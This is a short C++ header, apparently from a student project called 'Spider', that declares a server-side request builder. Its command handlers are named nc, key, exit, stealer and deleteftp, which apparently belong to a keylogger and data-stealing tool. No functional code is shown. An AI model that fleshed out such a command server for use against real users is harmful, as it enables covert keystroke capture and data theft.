//
// RequestBuilder.hpp for server in /home/galibe_s/rendu/Spider/server/core/request
//
// Made by stephane galibert
// Login   <galibe_s@epitech.net>
//
// Started on  Sat Nov  5 15:53:35 2016 stephane galibert
// Last update Tue Nov  8 18:03:16 2016 stephane galibert
//

#pragma once

#include <iostream>
#include <string>
#include <memory>
#include <functional>
#include <unordered_map>

#include <boost/noncopyable.hpp>

#include "Protocol.hpp"
#include "IRequest.hpp"
#include "Nc.hpp"
#include "Exit.hpp"
#include "Key.hpp"
#include "Stealer.hpp"
#include "DeleteFTP.hpp"

class RequestBuilder : private boost::noncopyable
{
public:
  typedef std::function<std::unique_ptr<IRequest>(void)> Cmds;
public:
  RequestBuilder(void);
  ~RequestBuilder(void);

  std::unique_ptr<IRequest> create(PacketType type) const;
private:
  std::unique_ptr<IRequest> nc(void) const;
  std::unique_ptr<IRequest> key(void) const;
  std::unique_ptr<IRequest> exit(void) const;
  std::unique_ptr<IRequest> stealer(void) const;
  std::unique_ptr<IRequest> deleteftp(void) const;

  std::unordered_map<int, Cmds> _cmds;
};
